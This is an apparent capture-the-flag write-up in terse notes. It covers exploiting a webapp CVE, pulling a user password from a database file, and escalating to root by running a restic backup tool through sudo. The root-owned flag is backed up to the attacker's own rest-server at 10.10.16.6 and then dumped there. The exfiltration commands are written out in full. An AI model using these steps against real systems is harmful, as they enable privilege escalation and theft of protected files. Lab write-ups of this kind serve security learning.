http at 8000 running a webapp vulnerable to [**[CVE-2024-28397](https://github.com/naclapor/CVE-2024-28397)**]
find the password for user marco in the instances/user.db file in app dir
user marco can run a restic backup tool "npbackup-cli" as root
on my host download and install restic + rest-server
use gtfobins guide to open a repo 
````
restic init -r "rest:http://localhost:$RPORT/$NAME"
````
then on target create a file that contains the repo password in my case "123"
`echo 123 > pass.txt`
then use raw restic commands, its easier 
`sudo npbackup-cli -c ~/npbackup.conf --raw 'backup -r rest:http://10.10.16.6:8000/backup "/root/root.txt" --password-file /tmp/pass.txt'`
notice the snapshot id in stdout
![[Pasted image 20251002155738.png]]
then on my host again 
`restic dump 74d097e5 /root/root.txt -r /tmp/restic/backup`
i get root.txt in stdout
